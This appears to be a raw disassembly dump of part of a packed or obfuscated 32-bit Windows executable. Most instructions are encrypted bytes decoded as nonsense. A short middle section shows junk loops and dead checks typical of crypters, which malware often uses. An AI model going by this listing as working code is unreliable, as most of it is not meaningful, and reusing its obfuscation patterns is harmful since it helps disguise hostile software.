  408bb5:	mov    ch,0xa6
  408bb7:	inc    ebx
  408bb8:	add    ebp,DWORD PTR [ebp+0x405a7c87]
  408bbe:	cdq    
  408bbf:	jns    0x408bae
  408bc1:	aas    
  408bc2:	call   0xddffe6cc
  408bc7:	inc    ebp
  408bc8:	push   es
  408bc9:	sahf   
  408bca:	aas    
  408bcb:	xchg   DWORD PTR [esi],ecx
  408bcd:	jne    0x408bb4
  408bcf:	jl     0x408b67
  408bd1:	xchg   ecx,eax
  408bd2:	iret   
  408bd3:	jmp    FWORD PTR [esi]
  408bd5:	adc    al,0xd3
  408bd7:	out    dx,al
  408bd8:	xor    ah,0x66
  408bdb:	imul   edx,DWORD PTR [ecx+0x3a],0x918ca4c9
  408be2:	jg     0x408c41
  408be4:	jae    0x408c5c
  408be6:	lods   eax,DWORD PTR ds:[esi]
  408be7:	xor    al,0x1f
  408be9:	jbe    0x408bed
  408beb:	sbb    ebx,edi
  408bed:	jp     0x408bb3
  408bef:	mov    dl,0x12
  408bf1:	inc    ecx
  408bf2:	hlt    
  408bf3:	ds in  eax,dx
  408bf5:	add    dh,ch
  408bf7:	(bad)  
  408bf8:	adc    ebp,DWORD PTR [eax+0x38d8ce9a]
  408bfe:	in     al,0xc9
  408c00:	push   cs
  408c01:	mov    dl,0xd3
  408c03:	mov    BYTE PTR [edx-0x17],0xd4
  408c07:	push   es
  408c08:	aaa    
  408c09:	lock jl 0x408beb
  408c0c:	aaa    
  408c0d:	sub    eax,0xe3928351
  408c12:	xor    dl,BYTE PTR [ebx+edi*2-0x3d5cc1]
  408c19:	mov    cl,0xfd
  408c1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c1c:	cmp    cl,bh
  408c1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c1f:	mov    DWORD PTR [ebx-0x4d],ebp
  408c22:	xchg   esp,eax
  408c23:	push   esi
  408c24:	je     0x408c1c
  408c26:	fiadd  WORD PTR [edx-0x35dac0c9]
  408c2c:	sbb    BYTE PTR [edi],bh
  408c2e:	je     0x408ca6
  408c30:	repnz xor ax,0x82cd
  408c35:	loope  0x408bce
  408c37:	test   al,0x6e
  408c39:	loop   0x408c3b
  408c3b:	icebp  
  408c3c:	nop
  408c3d:	loope  0x408bd0
  408c3f:	pop    es
  408c40:	sub    al,0x3b
  408c42:	iret   
  408c43:	in     al,dx
  408c44:	fnclex 
  408c46:	fwait
  408c47:	jo     0x408be2
  408c49:	inc    ebp
  408c4a:	rcl    BYTE PTR [esi],0xf4
  408c4d:	stos   BYTE PTR es:[edi],al
  408c4e:	ret    0x9603
  408c51:	popa   
  408c52:	xchg   esp,eax
  408c53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c54:	rol    BYTE PTR [ecx],1
  408c56:	xchg   edx,eax
  408c57:	dec    esi
  408c58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c59:	stc    
  408c5a:	sbb    ebp,ebp
  408c5c:	cmp    al,0x36
  408c5e:	pushf  
  408c5f:	dec    ebx
  408c60:	xchg   esi,eax
  408c61:	das    
  408c62:	add    ch,dl
  408c64:	push   edx
  408c65:	add    DWORD PTR [ebx+0xf371282],eax
  408c6b:	push   edx
  408c6c:	dec    ebp
  408c6d:	adc    BYTE PTR [eax-0x5615fc5d],bh
  408c73:	mov    al,0x53
  408c75:	cmp    al,0x81
  408c77:	mov    edi,0x3e508a4d
  408c7c:	and    esp,DWORD PTR [ecx+esi*2]
  408c7f:	hlt    
  408c80:	and    bl,dh
  408c82:	mov    DWORD PTR [ebx],0xcabdd3d1
  408c88:	lock dec ebp
  408c8a:	inc    esi
  408c8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c8c:	dec    edi
  408c8d:	jmp    0xaf0f:0xd6031c3a
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	aaa    
  408cb7:	sub    eax,0xdc142179
  408cbc:	jle    0x408d3c
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	mov    ebx,0x26dcd1d
  408cc7:	sub    BYTE PTR ds:0x74668e69,ah
  408ccd:	jmp    0x408cd3
  408ccf:	add    eax,0x68cbaca2
  408cd4:	je     0x408c97
  408cd6:	mov    bh,0x31
  408cd8:	imul   edx,DWORD PTR [ebx-0x40],0x921f8117
  408cdf:	jnp    0x408c8b
  408ce1:	stos   BYTE PTR es:[edi],al
  408ce2:	shl    DWORD PTR ss:[esi],1
  408ce5:	dec    esp
  408ce6:	sbb    eax,DWORD PTR [esi-0x70]
  408ce9:	jne    0x408ced
  408ceb:	test   BYTE PTR [ebx+0x35508b3c],ah
  408cf1:	jecxz  0x408ced
  408cf3:	jo     0x408ce3
  408cf5:	daa    
  408cf6:	jbe    0x408cf1
  408cf8:	ins    DWORD PTR es:[edi],dx
  408cf9:	js     0x408d31
  408cfb:	xchg   esi,eax
  408cfc:	jnp    0x408ce1
  408cfe:	lahf   
  408cff:	fistp  WORD PTR [edi]
  408d01:	fnsave [bp+di+0x1add]
  408d06:	out    dx,al
  408d07:	ret    
  408d08:	cmc    
  408d09:	enter  0xc772,0x8d
  408d0d:	jl     0x408d1f
  408d0f:	sahf   
  408d10:	cwde   
  408d11:	enter  0xba2a,0x6b
  408d15:	sub    BYTE PTR cs:[edx+0x2c],bl
  408d19:	dec    eax
  408d1a:	adc    al,0x25
  408d1c:	mov    esp,0x5ef763e4
  408d21:	loope  0x408cc1
  408d23:	xor    BYTE PTR [edx-0x69811d14],0xf8
  408d2a:	es sbb eax,0x416ce8b2
  408d30:	shl    DWORD PTR [eax-0x714c328f],cl
  408d36:	xor    bl,ch
  408d38:	mov    cl,0x62
  408d3a:	xor    dh,BYTE PTR [ebx-0x6a]
  408d3d:	ja     0x408cc4
  408d3f:	lods   eax,DWORD PTR ds:[esi]
  408d40:	ja     0x408d04
  408d42:	jecxz  0x408d70
  408d44:	inc    eax
  408d45:	and    al,0x31
  408d47:	aaa    
  408d48:	sahf   
  408d49:	pusha  
  408d4a:	int3   
  408d4b:	ficom  WORD PTR [edi-0x37]
  408d4e:	dec    esi
  408d4f:	dec    eax
  408d50:	outs   dx,WORD PTR ds:[esi]
  408d52:	add    bh,BYTE PTR [esi-0x43]
  408d55:	jle    0x408d91
  408d57:	add    eax,0xea8236f5
  408d5c:	shl    BYTE PTR [ebx],0x2b
  408d5f:	mov    bh,0x62
  408d61:	cmp    DWORD PTR [edi+0x3a3be250],edi
  408d67:	jmp    0xed32b7ea
  408d6c:	lea    eax,[ecx-0x4f]
  408d6f:	fsubr  DWORD PTR [esi]
  408d71:	inc    esi
  408d72:	push   edi
  408d73:	loop   0x408dba
  408d75:	pop    es
  408d76:	dec    ebp
  408d77:	retf   0x4d55
  408d7a:	ror    bh,1
  408d7c:	pusha  
  408d7d:	and    BYTE PTR [edi-0x4e],ah
  408d80:	lahf   
  408d81:	leave  
  408d82:	je     0x408d54
  408d84:	sbb    ch,ch
  408d86:	pop    esp
  408d87:	mov    ah,dh
  408d89:	ja     0x408d65
  408d8b:	cli    
  408d8c:	sbb    al,0x82
  408d8e:	or     cl,ah
  408d90:	test   al,0xba
  408d92:	cmp    bl,BYTE PTR [edx+0x749bf68f]
  408d98:	ret    
  408d99:	clc    
  408d9a:	sbb    edi,esp
  408d9c:	fwait
  408d9d:	dec    eax
  408d9e:	mov    dl,0x2b
  408da0:	mov    ds:0x373ee418,al
  408da5:	cmp    eax,0x12cead62
  408daa:	scas   eax,DWORD PTR es:[edi]
  408dab:	inc    esp
  408dac:	jp     0x408de2
  408dae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408daf:	(bad)  
  408db1:	lds    edx,FWORD PTR [edi-0x73]
  408db4:	pop    ss
  408db5:	or     al,0x1a
  408db7:	mov    WORD PTR [esi-0x64f2e525],gs
  408dbd:	adc    eax,0x8724e95
  408dc2:	xor    eax,0x76ffaa0e
  408dc7:	mov    edi,0x904caf86
  408dcc:	fst    st(6)
  408dce:	out    0xb7,al
  408dd0:	xor    edx,DWORD PTR [ecx+edi*8-0x46bae1a4]
  408dd7:	pop    ebx
  408dd8:	mov    edi,ebx
  408dda:	fild   QWORD PTR [esp+ebp*4-0xa]
  408dde:	aam    0x93
  408de0:	add    al,0xb4
  408de2:	pop    ecx
  408de3:	jns    0x408e5c
  408de5:	loope  0x408d95
  408de7:	(bad)  
  408de8:	sub    bl,BYTE PTR [edi+eax*8+0x7a5ad273]
  408def:	loop   0x408e05
  408df1:	or     edx,DWORD PTR [edx+0x120f04c6]
  408df7:	push   ecx
  408df8:	sbb    cl,BYTE PTR [esi]
  408dfa:	sbb    BYTE PTR [ecx],0x28
  408dfd:	cmp    al,0xf8
  408dff:	cmp    BYTE PTR [ebp+0x67d1ccd1],0xc
  408e06:	aad    0xbb
  408e08:	cmp    eax,0x69badaf3
  408e0d:	in     al,0x64
  408e0f:	ja     0x408e4d
  408e11:	test   eax,0x80ae548d
  408e16:	retf   
  408e17:	push   0x29
  408e19:	xchg   DWORD PTR [ebx-0x4f],esi
  408e1c:	mov    BYTE PTR [edx+0x26],al
  408e1f:	lock cmc 
  408e21:	pop    ss
  408e22:	dec    ecx
  408e23:	xchg   edi,eax
  408e24:	jbe    0x408e14
  408e26:	retf   
  408e27:	adc    eax,DWORD PTR [edx]
  408e29:	push   esi
  408e2a:	inc    edx
  408e2b:	cmp    dh,BYTE PTR [ebx]
  408e2d:	ret    0x5b3d
  408e30:	or     al,0xa8
  408e32:	jp     0x408e43
  408e34:	test   BYTE PTR [ecx-0x9],dl
  408e37:	(bad)  
  408e38:	dec    DWORD PTR [ebx+0x81f045]
  408e3e:	add    DWORD PTR ds:0x43e90740,esi
  408e44:	idiv   edi
  408e46:	dec    DWORD PTR [ebx-0x7d161bbb]
  408e4c:	add    DWORD PTR [eax],eax
  408e4e:	add    BYTE PTR ds:0xa417048d,dh
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x19e9e4e1
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	pop    ss
  408e68:	and    DWORD PTR [edi+0x36d36541],eax
  408e6e:	mov    dl,0x42
  408e70:	jo     0x408e13
  408e72:	pop    ss
  408e73:	out    0x10,eax
  408e75:	adc    eax,0x5f39be67
  408e7a:	mov    fs,eax
  408e7c:	pusha  
  408e7d:	push   0x7211ed46
  408e82:	fnsave [ecx]
  408e84:	xor    BYTE PTR es:[ebx+0x30],ch
  408e88:	test   eax,0x2252cde
  408e8d:	(bad)  
  408e8e:	es xchg ebx,eax
  408e90:	and    DWORD PTR [edx+0x4b],esi
  408e93:	das    
  408e94:	sub    al,0x8e
  408e96:	cdq    
  408e97:	shl    BYTE PTR [edx+0x64f986ca],cl
  408e9d:	in     al,dx
  408e9e:	push   ebp
  408e9f:	lods   eax,DWORD PTR ds:[esi]
  408ea0:	arpl   di,ax
  408ea2:	loopne 0x408e4e
  408ea4:	pushf  
  408ea5:	sub    BYTE PTR [edx+0x7],bh
  408ea8:	fwait
  408ea9:	call   0x95f1:0x7719713c
  408eb0:	jmp    0xea20:0x5a571be6
  408eb7:	xor    eax,0xaeb01a0b
  408ebc:	mov    dh,0x1b
  408ebe:	icebp  
  408ebf:	ds ror esi,cl
  408ec2:	dec    edx
  408ec3:	pop    ds
  408ec4:	fistp  WORD PTR [esi-0x45]
  408ec7:	sub    eax,0x12c250d5
  408ecc:	fdivr  QWORD PTR [ebx+0x10f58dc8]
  408ed2:	cmp    DWORD PTR [ebx+0x6ed5512c],esi
  408ed8:	cld    
  408ed9:	inc    edx
  408eda:	dec    ebp
  408edb:	repz mov ds:0xce62c3a0,eax
  408ee1:	xchg   ebx,eax
  408ee2:	enter  0xf9b1,0x63
  408ee6:	mov    ch,0x8b
  408ee8:	in     eax,dx
  408ee9:	(bad)  
  408eea:	or     BYTE PTR [edi],dh
  408eec:	call   DWORD PTR [ebp+0x75349ce7]
  408ef2:	inc    ebx
  408ef3:	icebp  
  408ef4:	aaa    
  408ef5:	retf   
  408ef6:	in     eax,dx
  408ef7:	mov    al,ds:0x992c2c66
  408efc:	out    0xa0,al
  408efe:	jl     0x408f0c
  408f00:	in     eax,0xde
  408f02:	or     al,0xb5
  408f04:	mov    WORD PTR [edi-0x7c],fs
  408f07:	ds push cs
  408f09:	cld    
  408f0a:	arpl   WORD PTR [eax],cx
  408f0c:	cmp    al,0x1f
  408f0e:	adc    cl,BYTE PTR [ebx]
  408f10:	out    dx,al
  408f11:	cwde   
  408f12:	fcomp  DWORD PTR [ebp+0x6b63a547]
  408f18:	pop    ds
  408f19:	mov    BYTE PTR [ecx+0x18],al
  408f1c:	sar    edi,1
  408f1e:	mov    al,ds:0x6be56539
  408f23:	push   eax
  408f24:	loope  0x408f15
  408f26:	and    ah,BYTE PTR [edi-0x5161e081]
  408f2c:	js     0x408f53
  408f2e:	int    0x40
  408f30:	mov    bh,0x50
  408f32:	cmp    DWORD PTR [esp+esi*4-0x46],edx
  408f36:	push   ebp
  408f37:	push   eax
  408f38:	fisttp QWORD PTR [edi]
  408f3a:	or     eax,0xd0ab3b5a
  408f3f:	sahf   
  408f40:	push   eax
  408f41:	sbb    BYTE PTR [esi-0x48f66f9c],ch
  408f47:	push   0x3ed21038
  408f4c:	mov    dh,0x55
  408f4e:	dec    edi
  408f4f:	or     ah,BYTE PTR [eax]
  408f51:	and    ebp,esi
  408f53:	pusha  
  408f54:	(bad)  
  408f55:	pop    ss
  408f56:	xor    edi,DWORD PTR [ecx]
  408f58:	(bad)  
  408f59:	push   esi
  408f5a:	cmc    
  408f5b:	out    0x6d,eax
  408f5d:	stc    
  408f5e:	aas    
  408f5f:	xchg   esp,eax
  408f60:	cmp    esi,0x703e2a92
  408f66:	xlat   BYTE PTR ds:[ebx]
  408f67:	and    ecx,DWORD PTR [ecx+0x11f8173f]
  408f6d:	mov    dh,0x2b
  408f6f:	mov    esp,0x60a347a6
  408f74:	pop    edx
  408f75:	pop    esi
  408f76:	jne    0x408f3e
  408f78:	rol    BYTE PTR [ebx],cl
  408f7a:	lds    ebx,FWORD PTR gs:[ebp+0x2f]
  408f7e:	imul   edi,esi,0x3c41ee71
  408f84:	mov    ebx,0x33924550
  408f89:	dec    edx
  408f8a:	jle    0x408ff1
  408f8c:	push   0x3d
  408f8e:	dec    edi
  408f8f:	push   edx
  408f90:	in     eax,dx
  408f91:	jno    0x408f1f
  408f93:	fisubr DWORD PTR [edi]
  408f95:	inc    ecx
  408f96:	lods   eax,DWORD PTR ds:[esi]
  408f97:	push   edx
  408f98:	pushf  
  408f99:	mov    ebx,0xbfef28d4
  408f9e:	test   eax,0x26daf5ef
  408fa3:	iret   
  408fa4:	ins    DWORD PTR es:[edi],dx
  408fa5:	test   BYTE PTR [edx+0x74],cl
  408fa8:	sbb    DWORD PTR [esi+0x75b4b179],eax
  408fae:	ror    ebp,0x5e
  408fb1:	pushf  
  408fb2:	jne    0x408f67
  408fb4:	mov    ds:0x977722e6,eax
  408fb9:	push   ebp
  408fba:	jmp    0x408ff9
  408fbc:	add    DWORD PTR [esi-0x72],esi
  408fbf:	xchg   esi,eax
  408fc0:	pop    esp
  408fc1:	mov    DWORD PTR [edx+edx*8-0x3f512d8],ecx
  408fc8:	add    DWORD PTR [edi],edx
  408fca:	mov    dh,0x34
  408fcc:	jmp    0x3839:0xf42d5b8d
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	lock pop edi
  409166:	push   ebp
  409167:	dec    ecx
  409168:	pusha  
  409169:	fidivr DWORD PTR [esi+0x7e]
  40916c:	jp     0x4091eb
  40916e:	jle    0x4091ee
  409170:	mov    edx,0x3073d24f
  409175:	mov    esp,0x9967bc18
  40917a:	retf   0xe3f3
  40917d:	xor    al,0x2b
  40917f:	jae    0x4091b5
  409181:	push   bx
  409183:	stc    
  409184:	int    0xb8
  409186:	cli    
  409187:	adc    eax,esi
  409189:	cdq    
  40918a:	in     eax,dx
  40918b:	retf   
  40918c:	sahf   
  40918d:	mov    ebp,0x2c0aa65e
  409192:	push   cs
  409193:	jb     0x40917c
  409195:	mov    ds:0xdc2a838,eax
  40919a:	add    BYTE PTR [edx+0x76],dh
  40919d:	in     eax,dx
  40919e:	xor    eax,0xfdd21fd6
  4091a3:	add    eax,0xcc0facdd
  4091a8:	push   cs
  4091a9:	xor    BYTE PTR [edi+0x787e43f0],al
  4091af:	cmp    eax,DWORD PTR gs:[ecx+0x78]
  4091b3:	retf   
  4091b4:	movntps XMMWORD PTR [edi+0x43],xmm4
  4091b8:	dec    ecx
  4091b9:	fadd   QWORD PTR [esi]
  4091bb:	in     eax,dx
  4091bc:	adc    DWORD PTR [eax],edi
  4091be:	pop    es
  4091bf:	push   ss
  4091c0:	push   eax
  4091c1:	imul   esp,esp,0xc64508ba
  4091c7:	out    0xd8,al
  4091c9:	jb     0x409194
  4091cb:	les    esi,FWORD PTR [eax+0x3ad44ff7]
  4091d1:	call   0xcf86:0xb4674559
  4091d8:	xor    eax,0x45491f2b
  4091dd:	ror    DWORD PTR [edi-0x153b5ffb],cl
  4091e3:	inc    ecx
  4091e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e5:	out    0x7a,al
  4091e7:	ret    
  4091e8:	adc    ah,BYTE PTR [esi+0x42]
  4091eb:	pop    ds
  4091ec:	mov    ebx,0x9b8909f0
  4091f1:	lods   al,BYTE PTR ds:[esi]
  4091f2:	lds    ebp,FWORD PTR [esi-0xf707e88]
  4091f8:	and    DWORD PTR ds:0x291a2c87,esp
  4091fe:	mov    edi,DWORD PTR [ebx]
  409200:	out    dx,eax
  409201:	sbb    al,al
  409203:	and    al,0xf7
  409205:	mov    esp,0x1b8fbcc8
  40920a:	inc    ebx
  40920b:	jge    0x40925e
  40920d:	mov    ds,WORD PTR [esi-0x8b886c4]
  409213:	add    dl,ah
  409215:	es in  eax,dx
  409217:	mov    ecx,0x77cf55a9
  40921c:	ja     0x409214
  40921e:	ror    BYTE PTR gs:[ebx-0x6ed11a1a],1
  409225:	dec    esi
  409226:	dec    ecx
  409227:	mov    al,ds:0xd036563a
  40922c:	pop    ebx
  40922d:	stos   BYTE PTR es:[edi],al
  40922e:	sbb    al,0xdc
  409230:	lahf   
  409231:	push   eax
  409232:	xchg   DWORD PTR [edx+0xd0997a8],ebx
  409238:	sbb    edi,esp
  40923a:	mov    eax,ds:0x41e859da
  40923f:	dec    ebp
  409240:	and    BYTE PTR [eax+ecx*1+0x75],bl
  409244:	xor    eax,0xccf3a9f6
  409249:	xor    DWORD PTR [ecx-0x13],esi
  40924c:	cmp    DWORD PTR [edx+0x85451d6],0x226ea6d9
  409256:	(bad)  
  409257:	test   eax,0xe81bade9
  40925c:	push   0xa9461e0c
  409261:	sub    al,0xad
  409263:	xchg   edi,eax
  409264:	dec    esi
  409265:	or     eax,0xe996083f
  40926a:	(bad)
  40926e:	lods   al,BYTE PTR ds:[esi]
  40926f:	cs enterw 0x6947,0x40
  409275:	and    al,0xbc
  409277:	nop
  409278:	xchg   edx,eax
  409279:	jb     0x4092b3
  40927b:	mov    ch,0x39
  40927d:	(bad)  
  40927e:	fnstcw WORD PTR [edx]
  409280:	inc    esp
  409281:	inc    ebp
  409282:	and    ebp,DWORD PTR ds:0xf5ff399a
  409288:	loope  0x409218
  40928a:	or     eax,0xa2a4c9bb
  40928f:	sub    al,0xf0
  409291:	mov    bh,0x69
  409293:	jbe    0x409289
  409295:	ins    DWORD PTR es:[edi],dx
  409296:	leave  
  409297:	dec    esp
  409298:	ret    
  409299:	gs xor al,0x2f
  40929c:	call   0x95a76120
  4092a1:	imul   edi,DWORD PTR [edi],0x23240fee
  4092a7:	and    BYTE PTR [esi+0x7b],dh
  4092aa:	icebp  
  4092ab:	mov    al,0xb1
  4092ad:	mov    al,0x2a
  4092af:	repnz xchg dh,cl
  4092b2:	in     al,0x9
  4092b4:	pop    es
  4092b5:	daa    
  4092b6:	adc    eax,DWORD PTR [eax]
  4092b8:	cdq    
  4092b9:	scas   al,BYTE PTR es:[edi]
  4092ba:	and    dh,cl
  4092bc:	and    al,0x52
  4092be:	fidivr WORD PTR [eax+0x7d]
  4092c1:	leave  
  4092c2:	jmp    0x409289
  4092c4:	inc    edi
  4092c5:	loope  0x409282
  4092c7:	sub    eax,0xe6f6dfce
  4092cc:	sahf   
  4092cd:	sbb    eax,0x5f7c85ff
  4092d2:	add    al,0xab
  4092d4:	adc    eax,0x9a9306b9
  4092d9:	std    
  4092da:	push   ecx
  4092db:	out    0xf8,al
  4092dd:	xor    dh,bh
  4092df:	or     al,0x64
  4092e1:	dec    esp
  4092e2:	xchg   esp,eax
  4092e3:	fcomp  QWORD PTR [ecx-0x7d]
  4092e6:	out    0xde,eax
  4092e8:	inc    ebp
  4092e9:	loopne 0x4092b6
  4092eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092ec:	xor    al,0xa3
  4092ee:	add    DWORD PTR [esi+0x76],edx
  4092f1:	out    0xf3,al
  4092f3:	xchg   eax,edx
  4092f5:	jp     0x40929c
  4092f7:	imul   esp,esi,0x98068dff
  4092fd:	push   ss
  4092fe:	inc    ebp
  4092ff:	cwde   
  409300:	daa    
  409301:	xchg   DWORD PTR [ebx-0x70],edi
  409304:	push   ss
  409305:	mov    ecx,0x418ebe28
  40930a:	xor    al,0xef
  40930c:	xor    al,0x54
  40930e:	mov    ch,0xbd
  409310:	out    0x7e,eax
  409312:	jmp    0x4092d6
  409314:	rcr    DWORD PTR [esi-0x56],1
  409317:	hlt    
  409318:	pop    edx
  409319:	add    DWORD PTR [ebx+0x2],edx
  40931c:	push   es
  40931d:	stos   BYTE PTR es:[edi],al
  40931e:	int    0xc1
  409320:	adc    eax,0xdabb06fb
  409325:	ds jae 0x40935b
  409328:	sub    DWORD PTR [eax+esi*1],ebp
  40932b:	retf   
  40932c:	push   es
  40932d:	jae    0x409355
  40932f:	mov    esp,0x8c128bf1
  409334:	or     DWORD PTR ds:0x9d34becf,esp
  40933a:	enter  0x4b9d,0x65
  40933e:	mov    ?,WORD PTR [edx+ebp*4-0x6f]
  409342:	pcmpgtb mm5,mm6
  409345:	jbe    0x409347
  409347:	outs   dx,BYTE PTR ds:[esi]
  409348:	xchg   DWORD PTR [eax-0x7887d0c3],esp
  40934e:	popf   
  40934f:	push   es
  409350:	xor    ecx,DWORD PTR [edx+ebp*2-0x2a28a8f1]
  409357:	push   edi
  409358:	dec    eax
  409359:	cwde   
  40935a:	cwde   
  40935b:	in     al,dx
  40935c:	mov    edi,0xec568515
  409361:	ret    0x121f
  409364:	mov    al,0x33
  409366:	(bad)  
  409367:	aam    0xd4
  409369:	enter  0xfb86,0xe5
  40936d:	xor    dh,bl
  40936f:	and    al,0x10
  409371:	arpl   WORD PTR [ebx-0x5db5eca0],si
  409377:	repnz or eax,0xdd384011
  40937d:	xchg   esp,eax
  40937e:	lods   eax,DWORD PTR ds:[esi]
  40937f:	ins    DWORD PTR es:[edi],dx
  409380:	cmp    al,0xf6
  409382:	mov    ?,ebp
  409384:	test   BYTE PTR [ebx],dl
  409386:	jne    0x4093dd
  409388:	push   es
  409389:	sub    ch,ch
  40938b:	sbb    esp,esp
  40938d:	mov    ds:0x62ede249,eax
  409392:	xchg   DWORD PTR [ebp+0x35],ecx
  409395:	ds nop
  409397:	cs push cs
  409399:	jne    0x40933f
  40939b:	sub    ebp,ebp
  40939d:	shr    BYTE PTR ds:0x9c95c2d0,0x9a
  4093a4:	push   ebp
  4093a5:	(bad)
  4093a8:	ror    BYTE PTR [eax],1
  4093aa:	sbb    eax,0xf0e7c033
  4093af:	stc    
  4093b0:	jae    0x4093a2
  4093b2:	bound  esp,QWORD PTR [esi+0x31]
  4093b5:	sahf   
  4093b6:	push   eax
  4093b7:	xchg   edi,eax
  4093b8:	in     eax,dx
  4093b9:	cmp    BYTE PTR ds:0x1171f524,dl
  4093bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093c0:	jg     0x409385
  4093c2:	mov    ecx,0xd177fc08
  4093c7:	jle    0x409428
  4093c9:	mov    esp,0x60f6f606
  4093ce:	cmp    eax,0xecfb8dff
  4093d3:	xor    al,0x74
  4093d5:	or     bl,BYTE PTR [esi+edi*4+0x78]
  4093d9:	xchg   ebx,eax
  4093da:	jl     0x409393
  4093dc:	cmp    ebx,ebx
  4093de:	imul   esp,eax,0x865d0471
  4093e4:	arpl   sp,sp
  4093e6:	sub    eax,0xb9dc752b
  4093eb:	push   cs
  4093ec:	jmp    0x409398
  4093ee:	pop    ebx
  4093ef:	bound  esi,QWORD PTR [edx]
  4093f1:	cdq    
  4093f2:	lds    edx,FWORD PTR [edi+0x30]
  4093f5:	or     DWORD PTR [ebp+0x46],edi
  4093f8:	loopne 0x40941e
  4093fa:	mov    bl,0xb1
  4093fc:	clc    
  4093fd:	sbb    ah,bl
  4093ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409400:	les    esp,FWORD PTR [edx-0x10304a17]
  409406:	rcr    edi,cl
  409408:	aas    
  409409:	mov    ecx,0x51a30f33
  40940e:	popf   
  40940f:	hlt    
  409410:	fidivr WORD PTR [ebp-0x5018f84]
  409416:	fst    DWORD PTR [ecx+0x3f]
  409419:	xchg   esi,eax
  40941a:	mov    al,ds:0xaaa7ce1f
  40941f:	push   ebp
  409420:	mov    edi,0xf36e5237
  409425:	mov    ebp,0x20e2e8cc
  40942a:	daa    
  40942b:	fldcw  WORD PTR [edi]
  40942d:	outs   dx,BYTE PTR ds:[esi]
  40942e:	out    dx,al
  40942f:	adc    al,0x36
  409431:	scas   eax,DWORD PTR es:[edi]
  409432:	mov    edi,0x99c91500
  409437:	retf   0x5928
